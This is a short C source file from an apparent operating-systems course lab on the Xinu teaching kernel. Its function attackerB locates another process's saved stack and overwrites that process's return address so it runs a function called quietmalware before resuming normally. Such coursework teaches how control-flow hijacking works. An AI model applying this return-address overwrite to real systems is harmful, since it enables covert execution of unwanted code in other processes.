/*  attackerB.c  - attackerB */

#include <xinu.h>

/*------------------------------------------------------------------------
 *  attackerB  -  calls quietmalware, also modify return address to second half of resched
 *  liu1589, lab4 part4, 3/27
 *------------------------------------------------------------------------
 */
void attackerB(int y) {	//victim Pid is getpid() - y

	int victimProc = getpid() - y;
	if (XINUDEBUG == 1){
		kprintf("attackerB: Who am I hijacking? pid: %d\n", victimProc);
	}
	struct procent *victimEntry = &proctab[victimProc];		//get victim proc's process entry
	uint32 *prstkptr = (uint32 *)victimEntry->prstkptr;	//get it's run-time stack
	
	prstkptr += 10;	//Go 10 up (8 for general purpose register,  1 for flag, 1 for register ebp for process exit)
	
	uint32 retAddr = *prstkptr;	//save original func address as return address for quietmalware
	*prstkptr = &quietmalware;	//assign quietmalware as function address
	
	prstkptr +=1;	//Go 1 more up and modified return address to original second half of resched
	*prstkptr = retAddr;
	return;
}